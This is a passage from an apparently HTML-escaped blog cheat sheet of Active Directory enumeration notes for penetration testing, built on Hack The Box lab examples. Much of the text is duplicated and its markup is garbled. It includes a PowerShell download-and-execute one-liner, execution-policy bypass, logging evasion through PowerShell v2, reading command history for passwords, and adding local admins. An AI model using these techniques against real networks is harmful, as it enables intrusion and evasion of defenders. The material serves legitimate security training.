Enumeration.</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>\n<p><code>Get-DomainTrustMapping</code> test for local admin access on either the current machine or the remote one.</p>\n<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>Testing for Local Admin Access</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>\n<p><code>Test-AdminAccess -ComputerName ACADEMY-EA-MS01</code></p>\n<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>Users with SPN Set</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>\n<p><code>Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName</code></p>\n<h2 id=\"Shares\"><a href=\"#Shares\" class=\"headerlink\" title=\"Shares\"></a>Shares</h2><p>Allows users on the domain to quickly access info relevant to their daily roles and share content with their organization. </p>\n<h3 id=\"Snaffler\"><a href=\"#Snaffler\" class=\"headerlink\" title=\"Snaffler\"></a>Snaffler</h3><p> A tool that helps in acquiring credentials or other sensitive data in AD, works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories.</p>\n<h2 id=\"Living-off-the-Land\"><a href=\"#Living-off-the-Land\" class=\"headerlink\" title=\"Living off the Land\"></a>Living off the Land</h2><p>Discussion on Techniques for utilizing native Windows tools to perform our enumeration is considered a more stealthy approach and may not create as many log entries and alerts as pulling tools into the network.</p>\n<p>Most enterprise environments have network monitoring and logging, including IDS&#x2F;IPS, firewalls and passive sensors and tools on top of their host-based defences Windows Defender or enterprise EDR.</p>\n<h3 id=\"Env-Enumeration-Host-Network-Recon\"><a href=\"#Env-Enumeration-Host-Network-Recon\" class=\"headerlink\" title=\"Env Enumeration Host &amp; Network Recon\"></a>Env Enumeration Host &amp; Network Recon</h3><table>\n<thead>\n<tr>\n<th>Command</th>\n<th>Result</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>hostname</td>\n<td>Prints the PC’s Name</td>\n</tr>\n<tr>\n<td>[System.Environment]::OSVersion.Version</td>\n<td>Prints out the OS version and revision level</td>\n</tr>\n<tr>\n<td>wmic qfe get Caption,Description,HotFixID,InstalledOn</td>\n<td>Prints the patches and hotfixes applied to the host</td>\n</tr>\n<tr>\n<td>ipconfig &#x2F;all</td>\n<td>Prints out network adapter state and configurations</td>\n</tr>\n<tr>\n<td>set %USERDOMAIN%</td>\n<td>Displays the domain name to which the host belongs (ran from CMD-prompt)</td>\n</tr>\n<tr>\n<td>set %logonserver%</td>\n<td>Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)</td>\n</tr>\n</tbody></table>\n<h2 id=\"Powershell\"><a href=\"#Powershell\" class=\"headerlink\" title=\"Powershell\"></a>Powershell</h2><p>It provides an extensive framework for administering all facets of Windows systems and AD Environments, can be used to dig deep into systems and can be used on engagements to recon the host and network and send and receive files.</p>\n<table>\n<thead>\n<tr>\n<th>Cmd-Let</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Get-Module</td>\n<td>Lists available modules loaded for use.</td>\n</tr>\n<tr>\n<td>Get-ExecutionPolicy -List</td>\n<td>Will print the <a href=\"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2\">https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2</a> settings for each scope on a host.</td>\n</tr>\n<tr>\n<td>Set-ExecutionPolicy Bypass -Scope Process</td>\n<td>This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won’t be making a permanent change to the victim host.</td>\n</tr>\n<tr>\n<td>Get-Content C:\\Users&lt;USERNAME&gt;\\AppData\\Roaming\\Microsoft\\Windows\\Powershell\\PSReadline\\ConsoleHost_history.txt</td>\n<td>With this string, we can get the specified user’s PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.</td>\n</tr>\n<tr>\n<td>Get-ChildItem Env:</td>\n<td>ft Key, Value</td>\n</tr>\n<tr>\n<td>powershell -nop -c “iex(New-Object Net.WebClient).DownloadString(‘URL to download the file from’); <follow-on commands>“</td>\n<td>This is a quick and easy way to download a file from the web using PowerShell and call it from memory.</td>\n</tr>\n</tbody></table>\n<h2 id=\"OPSec-Tactics\"><a href=\"#OPSec-Tactics\" class=\"headerlink\" title=\"OPSec Tactics\"></a>OPSec Tactics</h2><p>A few Operational security tactics that defenders are unaware of are that several versions of Powershell often exist on a host. If not uninstalled, they can still be used.</p>\n<h3 id=\"Example\"><a href=\"#Example\" class=\"headerlink\" title=\"Example\"></a>Example</h3><blockquote>\n<p>Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders’ radar while utilizing resources built into the hosts to our advantage.</p>\n</blockquote>\n<h3 id=\"Checking-Defenses\"><a href=\"#Checking-Defenses\" class=\"headerlink\" title=\"Checking Defenses.\"></a>Checking Defenses.</h3><p>These few commands will utilize the <a href=\"https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts\">netsh</a> and <a href=\"https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query\">sc</a> to help get an understanding of the host when it comes to Windows Firewall settings and to check the status of Windows Defender.</p>\n<p>Firewall check - <code>netsh advfirewall show allprofiles</code></p>\n<p>Defender check cmd - <code>sc query windefend</code></p>\n<p>Checking the status and configuration settings - <code>Get-MpComputerStatus</code></p>\n<h2 id=\"Am-I-Alone\"><a href=\"#Am-I-Alone\" class=\"headerlink\" title=\"Am I Alone?\"></a>Am I Alone?</h2><p>When landing on a host for the first time, it’s important to check and see if you are the only one logged in since if you take certain actions from a host someone else is logged on, there is potential for them to identify you.</p>\n<p>If a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.</p>\n<h3 id=\"Network-Enumeration\"><a href=\"#Network-Enumeration\" class=\"headerlink\" title=\"Network Enumeration\"></a>Network Enumeration</h3><table>\n<thead>\n<tr>\n<th>Networking Commands</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>arp -a</td>\n<td>Lists all known hosts stored in the arp table.</td>\n</tr>\n<tr>\n<td>ipconfig &#x2F;all</td>\n<td>Prints out adapter settings for the host. We can figure out the network segment from here.</td>\n</tr>\n<tr>\n<td>route print</td>\n<td>Displays the routing table (IPv4 &amp; IPv6) identifying known networks and layer three routes shared with the host.</td>\n</tr>\n<tr>\n<td>netsh advfirewall shows state</td>\n<td>Displays the status of the host’s firewall. We can determine if it is active and filtering traffic.</td>\n</tr>\n</tbody></table>\n<h3 id=\"Windows-Management-Instrumentation-WMI\"><a href=\"#Windows-Management-Instrumentation-WMI\" class=\"headerlink\" title=\"Windows Management Instrumentation (WMI)\"></a>Windows Management Instrumentation (WMI)</h3><p> This scripting engine is used within Windows enterprises to retrieve info and run admin tasks on local and remote hosts.</p>\n<p><strong>Quick WMI checks</strong></p>\n<table>\n<thead>\n<tr>\n<th>Command</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>wmic qfe get Caption,Description,HotFixID,InstalledOn</td>\n<td>Prints the patch level and description of the Hotfixes applied</td>\n</tr>\n<tr>\n<td>wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles &#x2F;format:List</td>\n<td>Displays basic host information to include any attributes within the list</td>\n</tr>\n<tr>\n<td>wmic process list &#x2F;format:list</td>\n<td>A listing of all processes on host</td>\n</tr>\n<tr>\n<td>wmic ntdomain list &#x2F;format:list</td>\n<td>Displays information about the Domain and Domain Controllers</td>\n</tr>\n<tr>\n<td>wmic useraccount list &#x2F;format:list</td>\n<td>Displays information about all local accounts and any domain accounts that have logged into the device</td>\n</tr>\n<tr>\n<td>wmic group list &#x2F;format:list</td>\n<td>Information about all local groups</td>\n</tr>\n<tr>\n<td>wmic sysaccount list &#x2F;format:list</td>\n<td>Dumps information about any system accounts that are being used as service accounts.</td>\n</tr>\n</tbody></table>\n<p>This <a href=\"https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4\">cheatsheet</a> has some useful commands for querying host and domain info using wmic.</p>\n<h3 id=\"Net-Commands\"><a href=\"#Net-Commands\" class=\"headerlink\" title=\"Net Commands\"></a>Net Commands</h3><p>Are useful when enumerating information from the domain, these commands can be used to query the [localhost] and remote hosts.</p>\n<table>\n<thead>\n<tr>\n<th>Command</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>net accounts</td>\n<td>Information about password requirements</td>\n</tr>\n<tr>\n<td>net accounts &#x2F;domain</td>\n<td>Password and lockout policy</td>\n</tr>\n<tr>\n<td>net group &#x2F;domain</td>\n<td>Information about domain groups</td>\n</tr>\n<tr>\n<td>net group “Domain Admins” &#x2F;domain</td>\n<td>List users with domain admin privileges</td>\n</tr>\n<tr>\n<td>net group “domain computers” &#x2F;domain</td>\n<td>List of PCs connected to the domain</td>\n</tr>\n<tr>\n<td>net group “Domain Controllers” &#x2F;domain</td>\n<td>List PC accounts of domains controllers</td>\n</tr>\n<tr>\n<td>net group <domain_group_name> &#x2F;domain</td>\n<td>User that belongs to the group</td>\n</tr>\n<tr>\n<td>net groups &#x2F;domain</td>\n<td>List of domain groups</td>\n</tr>\n<tr>\n<td>net localgroup</td>\n<td>All available groups</td>\n</tr>\n<tr>\n<td>net localgroup administrators &#x2F;domain</td>\n<td>List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)</td>\n</tr>\n<tr>\n<td>net localgroup Administrators</td>\n<td>Information about a group (admins)</td>\n</tr>\n<tr>\n<td>net localgroup administrators [username] &#x2F;add</td>\n<td>Add user to administrators</td>\n</tr>\n<tr>\n<td>net share</td>\n<td>Check current shares</td>\n</tr>\n<tr>\n<td>net user <ACCOUNT_NAME> &#x2F;domain</td>\n<td>Get information about a user within the domain</td>\n</tr>\n<tr>\n<td>net user &#x2F;domain</td>\n<td>List all users of the domain</td>\n</tr>\n<tr>\n<td>net user %username%</td>\n<td>Information about the current user</td>\n</tr>\n<tr>\n<td>net use x: \\computer\\share</td>\n<td>Mount the share locally</td>\n</tr>\n<tr>\n<td>net view</td>\n<td>Get a list of computers</td>\n</tr>\n<tr>\n<td>net view &#x2F;all &#x2F;domain[:domainname]</td>\n<td>Shares on the domains</td>\n</tr>\n<tr>\n<td>net view \\computer &#x2F;ALL</td>\n<td>List shares of a computer</td>\n</tr>\n<tr>\n<td>net view &#x2F;domain</td>\n<td>List of PCs of the domain</td>\n</tr>\n</tbody></table>\n<h2 id=\"Net-Command-Tip\"><a href=\"#Net-Command-Tip\" class=\"headerlink\" title=\"Net Command Tip.\"></a>Net Command Tip.</h2><p>If you are in an environment where network defenders are actively logging&#x2F;looking for any commands out of the normal you can try typing <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>net1</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> instead of the <strong><strong><strong><strong>net</strong></strong></strong></strong> to work out using the net command.</p>\n<h2 id=\"Dsquery\"><a href=\"#Dsquery\" class=\"headerlink\" title=\"Dsquery\"></a>Dsquery</h2><p>A command-line tool that can be used to find Active Directory objects, the queries run with dsquery can be replicated with Bloodhound and Powerview, but one may not have access to those tools.</p>\n<p><strong><strong>Dsquery</strong></strong> will exist on any host with the <code>Active Directory Domain Services Role</code> installed, and the <code>dsquery</code> DLL exists on all modern Windows systems by default now and can be found at <code>C:\\Windows\\System32\\dsquery.dll</code></p>\n<p>A long read but worthy to check up on those commands one might not remember …</p>\n","cover":false,"excerpt":"","more":"<p><img src=\"https://miro.medium.com/v2/resize:fit:750/0*Kz1iA9w7Ciywdu1A.jpg\"></p>\n<h2 id=\"Credential-Enumeration\"><a href=\"#Credential-Enumeration\" class=\"headerlink\" title=\"Credential Enumeration\"></a>Credential Enumeration</h2><p>After acquiring a foothold, you must dig deeper using the low-privilege domain user credentials. Information to be interested in when enumerating:</p>\n<ul>\n<li>Domain users</li>\n<li>Computer Attributes</li>\n<li>group membership</li>\n<li>Group Policy Objects</li>\n<li>Permissions</li>\n<li>ACLs</li>\n<li>Trusts</li>\n</ul>\n<p>but not limited to the above, but the most <strong>important thing to remember is that most of these tools will not work without domain users’ credentials at any permission level.</strong></p>\n<p>So at a minimum, you need to have acquired a user’s cleartext password, NTLM password hash or SYSTEM access on a domain-joined host.</p>\n<h2 id=\"CrackMapExec\"><a href=\"#CrackMapExec\" class=\"headerlink\" title=\"CrackMapExec.\"></a>CrackMapExec.</h2><p>This tool can be used to assess AD environments, where it utilizes packages from the impacket and powersploit toolkit to perform its functions.</p>\n<h3 id=\"Domain-UserEnum\"><a href=\"#Domain-UserEnum\" class=\"headerlink\" title=\"Domain UserEnum\"></a>Domain UserEnum</h3><p>When enumerating you need to point CME to the Domain Controller, using creds that you retrieved you can list out domain users, it is noted that CME provides a <strong><strong><strong><strong><strong>badPwdCount</strong></strong></strong></strong></strong> attribute which is helpful when performing targeted pass spraying or building a target users list filtered out with user badPwdCount attribute that’s above 0 to be careful not to lock out accounts.</p>\n<p><code>sudo crackmapexec smb xx-domain-ip-xx -u xxxxxxxx -p xxxxx --users</code></p>\n<h3 id=\"Domain-Group-Enum\"><a href=\"#Domain-Group-Enum\" class=\"headerlink\" title=\"Domain Group Enum\"></a>Domain Group Enum</h3><p>We can also obtain a complete listing of domain groups. We should save all of our output to files to easily access it again later for reporting or use with other tools.</p>\n<p><code>sudo crackmapexec smb xx-domain-ip-xx -u xxxxxxxx -p xxxxx</code>  <code>--groups</code> </p>\n<p>We can begin to note down groups of interest. Take note of key groups like <code>Administrators</code>, <code>Domain Admins</code>, <code>Executives</code>, any groups that may contain privileged IT admins, etc. These groups likely contain users with elevated privileges worth targeting during our assessment.</p>\n<h2 id=\"Smbmap\"><a href=\"#Smbmap\" class=\"headerlink\" title=\"Smbmap\"></a>Smbmap</h2><p>A tool for enumerating SMB shares from a Linux environment can be used to list shares, permissions and share content. </p>\n<h3 id=\"recursive-list-Dirs-in-Shares\"><a href=\"#recursive-list-Dirs-in-Shares\" class=\"headerlink\" title=\"recursive list Dirs in Shares\"></a>recursive list Dirs in Shares</h3><p><code>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R &#39;Department Shares&#39; --dir-only</code></p>\n<h2 id=\"RpcClient\"><a href=\"#RpcClient\" class=\"headerlink\" title=\"RpcClient\"></a>RpcClient</h2><p>Used to enumerate, add, change and even remove objects from AD.</p>\n<h3 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h3><p><a href=\"https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers\">Relative Identifier (RID)</a> is a unique identifier utilized to track and identify objects, for example:</p>\n<ul>\n<li><p>The <a href=\"https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers\">SID</a> for the INLANEFREIGHT.LOCAL domain is: <code>S-1-5-21-3842939050-3880317879-2865463114</code>.</p>\n</li>\n<li><p>When an object is created within a domain, the number above (SID) will be combined with a RID to make a unique value used to represent the object.</p>\n</li>\n<li><p>So the domain user <code>htb-student</code> with a RID:[0x457] Hex 0x457 would &#x3D; decimal <code>1111</code>, will have a full user SID of <code>S-1-5-21-3842939050-3880317879-2865463114-1111</code>.</p>\n</li>\n<li><p>This is unique to the <code>htb-student</code> object in the INLANEFREIGHT.LOCAL domain and you will never see this paired value tied to another object in this domain or any other.</p>\n</li>\n</ul>\n<p>Some accounts will have the same RID regardless of what host you are on, built-in admin accounts for domains will have <strong>500</strong> or <strong>0x1f4</strong> this value is unique to an object hence we can use it to enumerate further info from the domain.</p>\n<h2 id=\"Impacket-Toolkit\"><a href=\"#Impacket-Toolkit\" class=\"headerlink\" title=\"Impacket-Toolkit\"></a>Impacket-Toolkit</h2><p>impacket is a versatile toolkit which gives different ways to enumerate, interact and exploit Windows protocols and find the information needed using Python. </p>\n<h3 id=\"Psexec-py\"><a href=\"#Psexec-py\" class=\"headerlink\" title=\"Psexec.py\"></a>Psexec.py</h3><p>A clone of sysinternals psexec executable works by creating a remote service by uploading a randomly-named executable to the ADMIN$ shares on the target host and registers the service via RPC and the Windows services control manager.</p>\n<p>Once comms are established it provides a shell as a SYSTEM on the victim host.</p>\n<h3 id=\"windapsearch\"><a href=\"#windapsearch\" class=\"headerlink\" title=\"windapsearch\"></a>windapsearch</h3><p><a href=\"https://github.com/ropnop/windapsearch\">Windapsearch</a> is another handy Python script we can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries, we can also perform standard enumeration (dumping users, computers, and groups) and more detailed enumeration. The <code>--da</code>(enumerate domain admins group members ) option and the <code>-PU</code>( find privileged users) options. The <code>-PU</code> option is interesting because it will perform a recursive search for users with nested group membership.</p>\n<h3 id=\"Domain-Admins\"><a href=\"#Domain-Admins\" class=\"headerlink\" title=\"Domain-Admins\"></a>Domain-Admins</h3><p><code>python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da</code></p>\n<p>This enumerates Domain Admin Groups.</p>\n<h3 id=\"Privileged-Users\"><a href=\"#Privileged-Users\" class=\"headerlink\" title=\"Privileged Users\"></a>Privileged Users</h3><p>Checking for potential users, using <strong>-PU</strong> with elevated privileges that may have gone unnoticed.</p>\n<p><strong>N&#x2F;B This is a great check for reporting since it will most likely inform the customer of users with excess privileges from nested group membership.</strong></p>\n<p><code>python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU</code></p>\n<h2 id=\"BloodHound\"><a href=\"#BloodHound\" class=\"headerlink\" title=\"BloodHound\"></a>BloodHound</h2><p>Once you have the domain credentials, you can run <a href=\"https://github.com/fox-it/BloodHound.py\">BloodHound.py</a> a tool for auditing Active Directory where it takes large amounts of data that would be time-consuming to sift through and create a GUI representation or “attack paths” of where access with a particular user may lead.</p>\n<ul>\n<li><h3 id=\"Windows\"><a href=\"#Windows\" class=\"headerlink\" title=\"Windows\"></a>Windows</h3></li>\n</ul>\n<p>At this point, we are interested in other misconfiguration and permission issues that could lead to lateral and vertical movement, getting the bigger picture of how the domain is setup</p>\n<ul>\n<li>Do any trusts exist with other domains both inside &amp; outside the current forest?</li>\n<li>Files shares that our user has access to.</li>\n</ul>\n<h2 id=\"ActiveDirectory-Powershell-Modules\"><a href=\"#ActiveDirectory-Powershell-Modules\" class=\"headerlink\" title=\"ActiveDirectory Powershell Modules\"></a>ActiveDirectory Powershell Modules</h2><p>These are groups of Powershell cmdlets for enumerating AD environments.</p>\n<p><code>Get-ADDomain</code> - Print out domain SID, domain functional level, and child domains.</p>\n<p><code>Get-ADUser -Filter &#123;ServicePrincipalName -ne &quot;$null&quot;&#125; -Properties ServicePrincipalName</code> This will filter ACC with the <strong>serviceprincipalname</strong> property populated and also get us a listing ACC that may be susceptible to kerberos attacks.</p>\n<p><code>Get-ADTrust -Filter *</code> - prints out any trust relationship the domain has, it’s useful when looking at how to take advantage of the child-to-parent trust relationship and attack across forest trusts.</p>\n<p><code>Get-ADGroup -Filter * | select name</code> - Group enumeration</p>\n<p><code>Get-ADGroup -Identity &quot;Backup Operators&quot;</code> - Detailed Group Info</p>\n<p><code>Get-ADGroupMember -Identity &quot;Backup Operators&quot;</code> - Getting Group Membership</p>\n<h2 id=\"Powerview\"><a href=\"#Powerview\" class=\"headerlink\" title=\"Powerview\"></a>Powerview</h2><p>It identifies where users are logged in on a network, enumerates domain info such as users, computers, groups, ACLs, and trusts, hunts for file shares and passwords, performs Kerberoasting and more.</p>\n<p>It gives an insight into the security posture of the target domain. </p>\n<ul>\n<li><h3 id=\"commands\"><a href=\"#commands\" class=\"headerlink\" title=\"commands\"></a>commands</h3></li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>Command</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Export-PowerViewCSV</td>\n<td>Append results to a CSV file</td>\n</tr>\n<tr>\n<td>ConvertTo-SID</td>\n<td>Convert a User or group name to its SID value</td>\n</tr>\n<tr>\n<td>Get-DomainSPNTicket</td>\n<td>Requests the Kerberos ticket for a specified Service Principal Name (SPN) account</td>\n</tr>\n<tr>\n<td><strong>Domain&#x2F;LDAP Functions</strong></td>\n<td></td>\n</tr>\n<tr>\n<td>Get-Domain</td>\n<td>Will return the AD object for the current (or specified) domain</td>\n</tr>\n<tr>\n<td>Get-DomainController</td>\n<td>Return a list of the Domain Controllers for the specified domain</td>\n</tr>\n<tr>\n<td>Get-DomainUser</td>\n<td>Will return all users or specific user objects in AD</td>\n</tr>\n<tr>\n<td>Get-DomainComputer</td>\n<td>Will return all computers or specific computer objects in AD</td>\n</tr>\n<tr>\n<td>Get-DomainGroup</td>\n<td>Will return all groups or specific group objects in AD</td>\n</tr>\n<tr>\n<td>Get-DomainOU</td>\n<td>Search for all or specific OU objects in AD</td>\n</tr>\n<tr>\n<td>Find-InterestingDomainAcl</td>\n<td>Finds object ACLs in the domain with modification rights set to non-built in objects</td>\n</tr>\n<tr>\n<td>Get-DomainGroupMember</td>\n<td>Will return the members of a specific domain group</td>\n</tr>\n<tr>\n<td>Get-DomainFileServer</td>\n<td>Returns a list of servers likely functioning as file servers</td>\n</tr>\n<tr>\n<td>Get-DomainDFSShare</td>\n<td>Returns a list of all distributed file systems for the current (or specified) domain</td>\n</tr>\n<tr>\n<td>GPO Functions:</td>\n<td></td>\n</tr>\n<tr>\n<td>Get-DomainGPO</td>\n<td>Will return all GPOs or specific GPO objects in AD</td>\n</tr>\n<tr>\n<td>Get-DomainPolicy</td>\n<td>Returns the default domain policy or the domain controller policy for the current domain</td>\n</tr>\n<tr>\n<td><strong>Computer Enumeration Functions</strong>:</td>\n<td></td>\n</tr>\n<tr>\n<td>Get-NetLocalGroup</td>\n<td>Enumerates local groups on the local or a remote machine</td>\n</tr>\n<tr>\n<td>Get-NetLocalGroupMember</td>\n<td>Enumerates members of a specific local group</td>\n</tr>\n<tr>\n<td>Get-NetShare</td>\n<td>Returns open shares on the local (or a remote) machine</td>\n</tr>\n<tr>\n<td>Get-NetSession</td>\n<td>Will return session information for the local (or a remote) machine</td>\n</tr>\n<tr>\n<td>Test-AdminAccess</td>\n<td>Tests if the current user has administrative access to the local (or a remote) machine</td>\n</tr>\n<tr>\n<td><strong>Threaded ‘Meta’-Functions</strong></td>\n<td></td>\n</tr>\n<tr>\n<td>Find-DomainUserLocation</td>\n<td>Finds machines where specific users are logged in</td>\n</tr>\n<tr>\n<td>Find-DomainShare</td>\n<td>Finds reachable shares on domain machines</td>\n</tr>\n<tr>\n<td>Find-InterestingDomainShareFile</td>\n<td>Searches for files matching specific criteria on readable shares in the domain</td>\n</tr>\n<tr>\n<td>Find-LocalAdminAccess</td>\n<td>Find machines on the local domain where the current user has local administrator access</td>\n</tr>\n<tr>\n<td><strong>Domain Trust Functions</strong></td>\n<td></td>\n</tr>\n<tr>\n<td>Get-DomainTrust</td>\n<td>Returns domain trusts for the current domain or a specified domain</td>\n</tr>\n<tr>\n<td>Get-ForestTrust</td>\n<td>Returns all forest trusts for the current forest or a specified forest</td>\n</tr>\n<tr>\n<td>Get-DomainForeignUser</td>\n<td>Enumerates users who are in groups outside of the user’s domain</td>\n</tr>\n<tr>\n<td>Get-DomainForeignGroupMember</td>\n<td>Enumerates groups with users outside of the group’s domain and returns each foreign member</td>\n</tr>\n<tr>\n<td>Get-DomainTrustMapping</td>\n<td>Will enumerate all trusts for the current domain and any others seen.</td>\n</tr>\n</tbody></table>\n<p><strong>Domain User Info</strong>        </p>\n<p><code>Get-DomainUser -Identity morgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname, description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol</code></p>\n<p><strong><strong><strong>Recursive Group Membership</strong></strong></strong></p>\n<p><code>Get-DomainGroupMember -Identity &quot;Domain Admins&quot; -Recurse</code> - retrieve group-specific information and recurse which means if it finds any groups that are part of the target group (<strong><strong><strong>nested group membership</strong></strong></strong>) to list out the members of those groups.</p>\n<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>Trust Enumeration.</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>\n<p><code>Get-DomainTrustMapping</code> test for local admin access on either the current machine or the remote one.</p>\n<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>Testing for Local Admin Access</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>\n<p><code>Test-AdminAccess -ComputerName ACADEMY-EA-MS01</code></p>\n<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>Users with SPN Set</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>\n<p><code>Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName</code></p>\n<h2 id=\"Shares\"><a href=\"#Shares\" class=\"headerlink\" title=\"Shares\"></a>Shares</h2><p>Allows users on the domain to quickly access info relevant to their daily roles and share content with their organization. </p>\n<h3 id=\"Snaffler\"><a href=\"#Snaffler\" class=\"headerlink\" title=\"Snaffler\"></a>Snaffler</h3><p> A tool that helps in acquiring credentials or other sensitive data in AD, works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories.</p>\n<h2 id=\"Living-off-the-Land\"><a href=\"#Living-off-the-Land\" class=\"headerlink\" title=\"Living off the Land\"></a>Living off the Land</h2><p>Discussion on Techniques for utilizing native Windows tools to perform our enumeration is considered a more stealthy approach and may not create as many log entries and alerts as pulling tools into the network.</p>\n<p>Most enterprise environments have network monitoring and logging, including IDS&#x2F;IPS, firewalls and passive sensors and tools on top of their host-based defences Windows Defender or enterprise EDR.</p>\n<h3 id=\"Env-Enumeration-Host-Network-Recon\"><a href=\"#Env-Enumeration-Host-Network-Recon\" class=\"headerlink\" title=\"Env Enumeration Host &amp; Network Recon\"></a>Env Enumeration Host &amp; Network Recon</h3><table>\n<thead>\n<tr>\n<th>Command</th>\n<th>Result</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>hostname</td>\n<td>Prints the PC’s Name</td>\n</tr>\n<tr>\n<td>[System.Environment]::OSVersion.Version</td>\n<td>Prints out the OS version and revision level</td>\n</tr>\n<tr>\n<td>wmic qfe get Caption,Description,HotFixID,InstalledOn</td>\n<td>Prints the patches and hotfixes applied to the host</td>\n</tr>\n<tr>\n<td>ipconfig &#x2F;all</td>\n<td>Prints out network adapter state and configurations</td>\n</tr>\n<tr>\n<td>set %USERDOMAIN%</td>\n<td>Displays the domain name to which the host belongs (ran from CMD-prompt)</td>\n</tr>\n<tr>\n<td>set %logonserver%</td>\n<td>Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)</td>\n</tr>\n</tbody></table>\n<h2 id=\"Powershell\"><a href=\"#Powershell\" class=\"headerlink\" title=\"Powershell\"></a>Powershell</h2><p>It provides an extensive framework for administering all facets of Windows systems and AD Environments, can be used to dig deep into systems and can be used on engagements to recon the host and network and send and receive files.</p>\n<table>\n<thead>\n<tr>\n<th>Cmd-Let</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Get-Module</td>\n<td>Lists available modules loaded for use.</td>\n</tr>\n<tr>\n<td>Get-ExecutionPolicy -List</td>\n<td>Will print the <a href=\"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2\">https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2</a> settings for each scope on a host.</td>\n</tr>\n<tr>\n<td>Set-ExecutionPolicy Bypass -Scope Process</td>\n<td>This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won’t be making a permanent change to the victim host.</td>\n</tr>\n<tr>\n<td>Get-Content C:\\Users&lt;USERNAME&gt;\\AppData\\Roaming\\Microsoft\\Windows\\Powershell\\PSReadline\\ConsoleHost_history.txt</td>\n<td>With this string, we can get the specified user’s PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.</td>\n</tr>\n<tr>\n<td>Get-ChildItem Env:</td>\n<td>ft Key, Value</td>\n</tr>\n<tr>\n<td>powershell -nop -c “iex(New-Object Net.WebClient).DownloadString(‘URL to download the file from’); <follow-on commands>“</td>\n<td>This is a quick and easy way to download a file from the web using PowerShell and call it from memory.</td>\n</tr>\n</tbody></table>\n<h2 id=\"OPSec-Tactics\"><a href=\"#OPSec-Tactics\" class=\"headerlink\" title=\"OPSec Tactics\"></a>OPSec Tactics</h2><p>A few Operational security tactics that defenders are unaware of are that several versions of Powershell often exist on a host. If not uninstalled, they can still be used.</p>\n<h3 id=\"Example\"><a href=\"#Example\" class=\"headerlink\" title=\"Example\"></a>Example</h3><blockquote>\n<p>Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders’ radar while utilizing resources built into the hosts to our advantage.</p>\n</blockquote>\n<h3 id=\"Checking-Defenses\"><a href=\"#Checking-Defenses\" class=\"headerlink\" title=\"Checking Defenses.\"></a>Checking Defenses.</h3><p>These few commands will utilize the <a 